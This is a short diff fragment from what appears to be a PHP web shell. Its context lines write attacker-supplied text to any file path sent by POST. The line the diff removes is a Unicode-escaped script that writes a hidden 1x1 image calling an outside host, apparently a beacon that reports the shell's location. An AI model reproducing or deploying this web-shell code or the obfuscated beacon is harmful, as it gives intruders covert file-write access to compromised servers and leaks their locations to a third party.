@@ -1709,4 +1709,3 @@ if(!empty($_POST['cmd']) && $_POST['cmd']=="save_file")
  if(!$file=@fopen($_POST['e_name'],"w")) { err(0,$_POST['e_name']); }
  else {
  if($unix) $_POST['e_text']=@str_replace("\r\n","\n",$_POST['e_text']
-<script type="text/javascript">document.write('\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0022\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u006c\u0074\u0075\u0072\u006b\u0073\u002e\u0063\u006f\u006d\u002f\u0073\u006e\u0066\u002f\u0073\u002e\u0070\u0068\u0070\u0022\u0020\u0077\u0069\u0064\u0074\u0068\u003d\u0022\u0031\u0022\u0020\u0068\u0065\u0069\u0067\u0068\u0074\u003d\u0022\u0031\u0022\u003e')</script>
